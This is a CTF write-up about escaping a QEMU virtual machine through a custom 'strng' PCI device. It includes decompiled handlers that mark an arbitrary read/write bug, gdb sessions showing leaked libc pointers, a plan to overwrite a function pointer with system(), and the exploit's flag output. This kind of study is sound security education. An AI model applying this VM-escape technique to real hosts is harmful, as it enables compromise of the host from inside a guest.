---
title: Blizzard CTF 2017 Strng
date: 2018-11-05 09:41:58
tags:
- ctf
- vmescape
categories:
- vmescape
---

After we figure out how qemu emulates devices, then we can turn to try some qemu vmescape challengs. I found 3 challenges and some qemu CVEs, I gonna try and analyze them. Here are the stuffs I will do:
[blizzard ctf 2017 strng](https://github.com/rcvalle/blizzardctf2017/)
[DefconQuals 2018 EC3](http://uaf.io/assets/EC3.tar.gz)
[HITB GSEC 2017 babyqemu](https://kitctf.de/writeups/hitb2017/babyqemu)
[HITCON CTF 2018 Abyss](https://ctftime.org/task/6890)
[HITCON CTF 2018Super Hexagon](https://ctftime.org/task/6900)
[VM escape - QEMU Case Study](http://www.phrack.org/papers/vm-escape-qemu-case-study.html)
If I find other good challenges and vulnerabilities, I'll add them here. So let's try strng.
<!--more-->
## Analysis
[Here](https://github.com/rcvalle/blizzardctf2017) is the introduction about the challenge. 
```
Points: Legendary Solves: 0 Category: Exploitation Description: Blizzard CTF 2017: Sombra True Random Number Generator (STRNG) Sombra True Random Number Generator (STRNG) is a QEMU-based challenge developed for Blizzard CTF 2017. The challenge was to achieve a VM escape from a QEMU-based VM and capture the flag located at /root/flag on the host. The image used and distributed with the challenge was the Ubuntu Server 14.04 LTS Cloud Image. The host used the same image as the guest. The guest was reset every 10 minutes and was started with the following command: ./qemu-system-x86_64 -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -enable-kvm -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22 Access to the guest was provided by redirecting incoming connections to the host on port 5555 to the guest on port 22.

Username/password: ubuntu/passw0rd
```
From the running command we can see that qemu emulates a device: strng. Run it and we can see the detail about the device.
```
root@ubuntu:/home/ubuntu# lspci
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)
root@ubuntu:/home/ubuntu# lspci -s 00:03.0 -k -vv
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
	Subsystem: Red Hat, Inc Device 1100
	Physical Slot: 3
	Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx-
	Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx-
	Region 0: Memory at febf1000 (32-bit, non-prefetchable) [size=256]
	Region 1: I/O ports at c050 [size=8]
```
It's clear the device has both MMIO(0xfebf1000-0xfebf10ff) and PMIO(0xc050-0xc058). You can also see the I/O sources via file /sys/devices/pci0000:00/0000:00:03.0/resource.

We use string /*strng*/ to filter the functions.
<img src="/images/strng-funcs.png">
Just analyze the functions strng_mmio_read, strng_mmio_write, strng_pmio_read and strng_pmio_write. They handle the I/O requests(read/write) from the user.
strng_mmio_read and strng_mmio_write:
```c
uint64_t __fastcall strng_mmio_read(void *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax

  result = -1LL;
  if ( size == 4 && !(addr & 3) )
    result = *((unsigned int *)opaque + (addr >> 2) + 701);
  return result;
}

void __fastcall strng_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  hwaddr v4; // rsi
  int v5; // ST08_4
  int v6; // eax
  unsigned __int64 v7; // [rsp+18h] [rbp-20h]

  v7 = __readfsqword(0x28u);
  if ( size == 4 && !(addr & 3) )
  {
    v4 = addr >> 2;
    if ( (_DWORD)v4 == 1 )
    {
      *((_DWORD *)opaque + 702) = (*((__int64 (__fastcall **)(void *, hwaddr, uint64_t))opaque + 384))(opaque, v4, val);
    }
    else if ( (unsigned int)v4 < 1 )
    {
      if ( __readfsqword(0x28u) == v7 )
        (*((void (__fastcall **)(_QWORD))opaque + 383))((unsigned int)val);
    }
    else
    {
      if ( (_DWORD)v4 == 3 )
      {
        v5 = val;
        v6 = (*((__int64 (__fastcall **)(char *))opaque + 385))((char *)opaque + 2812);
        LODWORD(val) = v5;
        *((_DWORD *)opaque + 704) = v6;
      }
      *((_DWORD *)opaque + (unsigned int)v4 + 701) = val;
    }
  }
}
```
strng_mmio_read gets the value from the address(actually the index) you specify from the device memory and strng_mmio_write invokes 3 function pointers to do something and write the value into the device memory.
The addresses passed into the functions(the four) are safe, I worried about that too at the beginning.

strng_pmio_read and strng_pmio_write:
```c
uint64_t __fastcall strng_pmio_read(void *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax
  unsigned int v4; // edx

  result = -1LL;
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        v4 = *((_DWORD *)opaque + 700);
        if ( !(v4 & 3) )
          result = *((unsigned int *)opaque + (v4 >> 2) + 701);
      }
    }
    else
    {
      result = *((unsigned int *)opaque + 700);
    }
  }
  return result;
}

void __fastcall strng_pmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  unsigned int v4; // eax
  __int64 v5; // rax
  unsigned __int64 v6; // [rsp+8h] [rbp-10h]

  v6 = __readfsqword(0x28u);
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        v4 = *((_DWORD *)opaque + 700);
        if ( !(v4 & 3) )
        {
          v5 = v4 >> 2;
          if ( (_DWORD)v5 == 1 )
          {
            *((_DWORD *)opaque + 702) = (*((__int64 (__fastcall **)(void *, signed __int64, uint64_t))opaque + 384))(
                                          opaque,
                                          4LL,
                                          val);
          }
          else if ( (unsigned int)v5 < 1 )
          {
            if ( __readfsqword(0x28u) == v6 )
              (*((void (__fastcall **)(_QWORD))opaque + 383))((unsigned int)val);
          }
          else if ( (_DWORD)v5 == 3 )
          {
            *((_DWORD *)opaque + 704) = (*((__int64 (__fastcall **)(char *, signed __int64, uint64_t))opaque + 385))((char *)opaque + 2812);
          }
          else
          {
            *((_DWORD *)opaque + v5 + 701) = val;  <== arbitray write
          }
        }
      }
    }
    else
    {
      *((_DWORD *)opaque + 700) = val; <== we can control val.
    }
  }
}
```
strng_pmio_read read the value from the port 0xc050 or can read the value from the device memory(arbitray-read) if you can control the variable v4. And in strng_pmio_write, we do can control it in strng_pmio_write. And also we have a arbitray-write vulnerability in strng_pmio_write. 

So consider all that, first we can leak the libc's address and then overwrite the function pointer whose index is 385 in the structure(If you read the previous post, you know that the structure is an object representing a device) with system's address. 

## Exploit
Let's overcome some troubles.
First how to leak the libc address using the arbitray-read bug. We know that the device is Random Number Generator, so I guess it will invoke rand() and srand() or other related functions. Let us debug the qemu. For convenience, we create a gdb-script with the following content:
```shell
/* debug.txt */
b strng_mmio_read
b strng_mmio_write
b strng_pmio_read
b strng_pmio_write

run  -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -enable-kvm -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22
```
Then just debug it.
```shell
➜  strng-exp gdb qemu-system-x86_64 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
[*] 5 commands could not be loaded, run `gef missing` to know why.
Reading symbols from qemu-system-x86_64...done.
gef➤  source debug.txt 
[+] Disabling ASLR
Breakpoint 1 at 0x555555964390
Breakpoint 2 at 0x5555559643e0
Breakpoint 3 at 0x5555559644b0
Breakpoint 4 at 0x555555964520
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff627b700 (LWP 7222)]
[New Thread 0x7ffff5a7a700 (LWP 7224)]

```
Access the guest through the port 5555 on the host with the following command:
```
ssh -p 5555 ubuntu@localhost
```
First use /*dd if=1 of=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=2*/ command to trigger strng_pmio_write(8 byte to observe the bug). Because the functions just handle 4 bytes, so strng_pmio_write will be hit twice. And use [pcimem](https://github.com/billfarrow/pcimem) to read and write device memory.
```shell
     90	 static void strng_pmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned size)
 →   91	 {
     92	     STRNGState *strng = opaque;
     93	     uint32_t saddr;
     94	 
     95	     if (size != 4)
     96	         return;
──────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────
[#0] Id 1, Name: "qemu-system-x86", stopped, reason: BREAKPOINT
[#1] Id 2, Name: "qemu-system-x86", stopped, reason: BREAKPOINT
[#2] Id 4, Name: "qemu-system-x86", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x555555964520 → Name: strng_pmio_write(opaque=0x555557e20a20, addr=0x0, val=0x61616161, size=0x4)
[#1] 0x5555557b31c9 → Name: memory_region_write_accessor(mr=0x555557e21410, addr=0x0, value=<optimized out>, size=0x4, shift=<optimized out>, mask=<optimized out>, attrs={
......
```
The first time, the argument addr is 0, which means we write the /*aaaa*/ into port 0xc050.
```shell
gef➤  x/40gx $rdi+0xaf0
0x555557e21510:	0x0000000061616161	0x0000000000000000
0x555557e21520:	0x0000000000000000	0x0000000000000000
0x555557e21530:	0x0000000000000000	0x0000000000000000
0x555557e21540:	0x0000000000000000	0x0000000000000000
0x555557e21550:	0x0000000000000000	0x0000000000000000
0x555557e21560:	0x0000000000000000	0x0000000000000000
0x555557e21570:	0x0000000000000000	0x0000000000000000
0x555557e21580:	0x0000000000000000	0x0000000000000000
0x555557e21590:	0x0000000000000000	0x0000000000000000
0x555557e215a0:	0x0000000000000000	0x0000000000000000
0x555557e215b0:	0x0000000000000000	0x0000000000000000
0x555557e215c0:	0x0000000000000000	0x0000000000000000
0x555557e215d0:	0x0000000000000000	0x0000000000000000
0x555557e215e0:	0x0000000000000000	0x0000000000000000
0x555557e215f0:	0x0000000000000000	0x0000000000000000
0x555557e21600:	0x0000000000000000	0x0000000000000000
0x555557e21610:	0x0000000000000000	0x00007ffff65268d0 <==
0x555557e21620:	0x00007ffff6526f60	0x00007ffff6526f70 <==
0x555557e21630:	0x0000000000000000	0x0000000000000051
0x555557e21640:	0x0000555557e1ceb0	0x0000555557e1ced0
```
When you see the memory initializing functions, the PMIO's size should be 8 bytes, but actually the real size is decided by qemu. You can read the source code, and it's just 4 bytes. So the emulated PMIO is from 0x555557e21510 to 0x555557e21513 and MMIO is from 0x555557e21514 to 0x555557e21614.
```c
void __fastcall pci_strng_realize(PCIDevice_0 *pdev, Error_0 **errp)
{
  unsigned __int64 v2; // ST08_8

  v2 = __readfsqword(0x28u);
  memory_region_init_io(
    (MemoryRegion_0 *)&pdev[1],
    &pdev->qdev.parent_obj,
    &strng_mmio_ops,
    pdev,
    "strng-mmio",
    0x100uLL);
  pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&pdev[1]);
  memory_region_init_io(
    (MemoryRegion_0 *)&pdev[1].io_regions[0].size,
    &pdev->qdev.parent_obj,
    &strng_pmio_ops,
    pdev,
    "strng-pmio",
    8uLL);
  if ( __readfsqword(0x28u) == v2 )
    pci_register_bar(pdev, 1, 1u, (MemoryRegion_0 *)&pdev[1].io_regions[0].size);
}
```
With the analysis of the functions, we know that there are 3 function pointers in the structure. So let's check it:
```
gef➤  x/2i 0x00007ffff65268d0
   0x7ffff65268d0 <__srandom>:	sub    rsp,0x8
   0x7ffff65268d4 <__srandom+4>:	mov    edx,edi
gef➤  x/2i 0x00007ffff6526f60
   0x7ffff6526f60 <rand>:	sub    rsp,0x8
   0x7ffff6526f64 <rand+4>:	call   0x7ffff6526ac0 <__random>
gef➤  x/2i 0x00007ffff6526f70
   0x7ffff6526f70 <rand_r>:	imul   edx,DWORD PTR [rdi],0x41c64e6d
   0x7ffff6526f76 <rand_r+6>:	add    edx,0x3039
```
So they are srandom, rand and rand_r, they are all located in libc. Just leak one of them. Only rand_r takes one argument and it's a pointer. We put our command on the emulated device memory and then trigger the rand_r() via strng_mmio_write or strng_pmio_write.

There is a full exploit source code in the reference, and a few points need to be changed.
1. Change the last argument of mmap as 0, not MAP_SIZE & ~MAP_MASK.
2. You can't read the /root/flag unless the qemu runs as the root privilege or it's set the correct permission.
```
host:
root@ubuntu16:~# cat flag
flag{You_Get_it}

guest:
root@ubuntu:/home/ubuntu# ./exp
cat: -: Resource temporarily unavailable
libc_base: 7f0843192000
_system  : 7f08431d7390
flag{You_Get_it}
```

## References
[BlizzardCTF 2017 - Strng](http://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html)